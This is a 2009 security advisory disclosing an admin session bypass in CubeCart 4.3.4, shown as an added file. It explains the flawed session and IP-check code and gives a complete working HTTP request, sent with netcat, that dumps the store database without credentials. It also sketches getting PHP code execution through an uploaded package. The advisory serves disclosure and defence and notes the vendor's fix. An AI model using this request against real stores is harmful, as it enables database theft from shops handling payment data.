@@ -1,0 +1,275 @@
+CubeCart 4 Session Management Bypass
+
+Release Date: 2009/10/29
+Author: Bogdan Calin (bogdan [at] acunetix [dot] com)
+Severity: Critical
+Vendor Status: Vendor has released an updated version
+
+I. Background
+
+>From Wikipedia: CubeCart is a free-to-use eCommerce software solution,
+designed to allow individuals and businesses sell tangible and digital
+goods on line.
+CubeCart is not Open Source software, although full source code is
+available at no cost, and the custom licensing model allows for
+customisation of the code.
+...
+CubeCart has developed a large fanbase, due in part, to the relative
+ease of creating modifications and enhancements.
+In the September/October 2007 issue of Practical eCommerce magazine,
+CubeCart was placed at #1 in their list of '100 Most Notable Shopping
+Carts'.
+
+II. Description
+
+While auditing the source code of CubeCart version v4.3.4, I've found a
+critical vulnerability in this application.
+Basically, session managament for administrative users is flawed. It's
+easy to bypass it without providing any credentials.
+An attacker can later perform any actions the administrator can, such as
+dumping the database, install modules (PHP code execution) and so on.
+
+CubeCart is using a MySQL table named CubeCart_admin_users for storing
+information about administrative users.
+When an administrator logs in, the applications stores his session ID,
+browser (user agent) and IP address in the sessId, browser and sessIP
+fields.
+> SELECT adminId, username, sessId, browser, sessIp FROM
+CubeCart_admin_users C;
+1, 'admin', '9a58f70e7ded1bcb568b02815a1c4a56', 'Mozilla/5.0 (Windows;
+U; Windows NT 5.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko)
+Chrome/3.0.195.27 Safari/532.0', '192.168.0.26'
+
+When the adminstrator logs out, these values are cleared. So sessId and
+the others fields become empty (as in an empty string).
+> SELECT adminId, username, sessId, browser, sessIp FROM
+CubeCart_admin_users C;
+1, 'admin', '', '', ''
+
+Let's analyze the code:
+
+In classes\session\cc_admin_session.php, on line 56 there is:
+
+$query = sprintf("SELECT * FROM
+".$this->glob['dbprefix']."CubeCart_admin_users WHERE sessId = %s",
+$this->db->mySQLSafe($GLOBALS[CC_ADMIN_SESSION_NAME]));
+
+This will select the fields for the administrative user corresponding to
+the session identified by sessID.
+But when the administrative user is logged out, sessID is empty. So, we
+can bypass this check by using an empty sessID.
+
+There are 2 more checks that need to be bypassed:
+There is this piece of code:
+
+if (strpos($_SERVER['HTTP_USER_AGENT'],'AOL') == false &&
+$ccAdminData[0]['sessIp'] !== $client_ip || $ccAdminData[0]['browser']
+!== $_SERVER['HTTP_USER_AGENT']) {
+				$this->logout();
+			}
+
+The HTTP_USER_AGENT check can be easily bypassed using an empty user agent.
+How about the $client_ip check?
+
+At first I was thinking that it's not possible to bypass that.
+
+Let's look at the code:
+Filename "includes\functions.inc.php", line 36:
+
+## Get Client IP Address
+function get_ip_address() {
+    ## New line added for cluser/cloud type hosting e.g. Mosso
+	if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && !detectSSL()) return
+$_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
+	## Otherwise use standard IP checks
+	$address    = false;
+	if (isset($_SERVER['REMOTE_ADDR'])) {	
+	    if (PHP51_MODE) {    	
+	        if (preg_match('#(?:\d{1,3}\.){3}\d{1,3}#',
+$_SERVER['REMOTE_ADDR'])) {
+	            ## Valid IPv4 Address
+	            $address    = $_SERVER['REMOTE_ADDR'];
+	            if
+(preg_match('#^(10\.[0-255]|169\.254|172\.(1[6-9]|2[0-9]|3[12])|192\.168)#',
+$address)) {
+	                foreach (array('HTTP_X_FORWARDED_FOR',
+'HTTP_CLIENT_IP') as $key) {
+	                    if (isset($_SERVER[$key]) &&
+preg_match('#^[0-255]\.[0-255]\.[0-255]\.[0-255]$#', $_SERVER[$key])) {
+	                        $address = $_SERVER[$key];
+	                        break;
+	                    }
+	                }
+	            }
+	        }
+	    } else {
+	        if (filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP,
+FILTER_FLAG_IPV4)) {
+	            ## Valid IPv4 Address
+	            $address    = $_SERVER['REMOTE_ADDR'];
+	            if
+(preg_match('#^(10\.[0-255]|169\.254|172\.(1[6-9]|2[0-9]|3[12])|192\.168)#',
+$address)) {
+	                foreach (array('HTTP_X_FORWARDED_FOR',
+'HTTP_CLIENT_IP') as $key) {
+	                    if (isset($_SERVER[$key]) &&
+filter_var($_SERVER[$key], FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
+	                        $address = $_SERVER[$key];
+	                        break;
+	                    }
+	                }
+	            }
+	        } elseif (filter_var($_SERVER['REMOTE_ADDR'],
+FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
+	            ## Valid IPv6 Address
+	            $address    = $_SERVER['REMOTE_ADDR'];
+	        }
+		}
+		return $address;
+	} else {
+		return false;
+	}
+
+}
+
+There are all these complex checks for validating
+$_SERVER['REMOTE_ADDR']. However, $_SERVER['REMOTE_ADDR'] cannot be faked.
+And then, on the first line there is:
+
+if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']) && !detectSSL()) return
+$_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
+
+This line will bypass all those complex checks.
+So, you just need to send an X_CLUSTER_CLIENT_IP header with an empty value.
+
+This line of code (the one with X_CLUSTER_CLIENT_IP) looks like a hack
+to me.
+It was probably added later to fix some bug or add a new feature.
+
+So, by entering empty sessId (ccAdmin cookie), user-agent and
+X_CLUSTER_CLIENT_IP header you can bypass the authentication and perform
+any actions an adminstrator can perform.
+
+Here is a sample HTTP request that will dump the whole database in one
+request:
+
+---------------------------------------------------------------------------------
+POST /CubeCart-latest/admin.php?_g=maintenance/backup HTTP/1.1
+Host: bld02
+Content-Type: multipart/form-data;
+boundary=----WebKitFormBoundaryCpv+NVAHAgHHdvdI
+User-Agent:
+X_CLUSTER_CLIENT_IP:
+Cookie: ccAdmin=+
+Accept: */*;q=0.5
+Content-Length: 434
+
+------WebKitFormBoundaryCpv+NVAHAgHHdvdI
+Content-Disposition: form-data; name="structure"
+
+1
+------WebKitFormBoundaryCpv+NVAHAgHHdvdI
+Content-Disposition: form-data; name="data"
+
+1
+------WebKitFormBoundaryCpv+NVAHAgHHdvdI
+Content-Disposition: form-data; name="dbbackup"
+
+1
+------WebKitFormBoundaryCpv+NVAHAgHHdvdI
+Content-Disposition: form-data; name="submit"
+
+Download Now
+------WebKitFormBoundaryCpv+NVAHAgHHdvdI--
+
+---------------------------------------------------------------------------------
+
+You can save it in a text file and use it with netcat
+(http://netcat.sourceforge.net/) like:
+
+>nc bld02 80 < db_dump.txt | more
+
+HTTP/1.1 200 OK
+Date: Tue, 20 Oct 2009 09:01:58 GMT
+Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.3 with Suhosin-Patch
+mod_ssl/2.2.9 OpenSSL/0.9.8g
+X-Powered-By: PHP/5.2.6-2ubuntu4.3
+Pragma: private
+Cache-control: private, must-revalidate
+Content-Disposition: attachment; filename=cubecartlatest_20Oct09.sql
+Content-length: 80864
+Content-Transfer-Encoding: binary
+Content-Type: application/octet-stream
+
+-- --------------------------------------------------------
+-- CubeCart SQL Dump
+-- version 4.3.4
+-- http://www.cubecart.com
+--
+-- Host: localhost
+-- Generation Time: Oct 20 2009, 12:01 PM
+-- Server version: 5.0.67-0ubuntu6
+-- PHP Version: 5.2.6-2ubuntu4.3
+--
+-- Database: `cubecartlatest`
+-- --------------------------------------------------------
+
+--
+-- Table structure for table `CubeCart_Coupons`
+--
+
+...
+
+CREATE TABLE `CubeCart_transactions` (
+   `id` int(11) NOT NULL auto_increment,
+   `gateway` varchar(255),
+   `extra` varchar(255),
+   `status` varchar(50),
+   `customer_id` int(11),
+   `order_id` varchar(255),
+   `trans_id` varchar(50),
+   `time` int(10),
+   `amount` decimal(30,2),
+   `remainder` decimal(30,2) DEFAULT '0.00' NOT NULL,
+   `notes` text,
+ PRIMARY KEY (`id`),
+ KEY `customer_id` (`customer_id`)
+) ENGINE MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1
+COLLATE=utf8_unicode_ci ;
+
+--
+-- Dumping data for table `CubeCart_transactions`
+--
+
+An administrator can install CubeCart packages, and it's trivial to
+create a dummy package with a shell inside and install it.
+Therefore, PHP code execution is possible and quite trivial to achieve.
+
+III. Workaround
+The vendor was notified about this vulnerability on 20 October 2009 and
+they’ve released a fix on 26 October 2009.
+The problem was fixed in CubeCart version 4.3.5, which is available
+here: http://forums.cubecart.com/index.php?showtopic=39691.
+
+However, the post "CubeCart 4.3.5 Released, Maintenance Release",
+doesn't include any information about this critical vulnerability.
+[Quote]
+Whats new?
+- URL's Changed in WorldPay module to match "RBS Worldpay" branding
+- PayPal 3D Secure Fix & Enhancements *
+- Moneybookers Payment Notification Fix
+- Database Class Optimization
+- Misc bugs...
+[/Quote]
+
+I find this behaviour completely unprofessional: a vendor should inform
+his customers when a serious vulnerability is fixed in their product.
+Especially when the product is processing credit card data, like
+CubeCart does.
+
+
+-- 
+Bogdan Calin - bogdan@acunetix.com
+CTO
+Acunetix Ltd. - http://www.acunetix.com
+Acunetix Web Security Blog - http://www.acunetix.com/blog
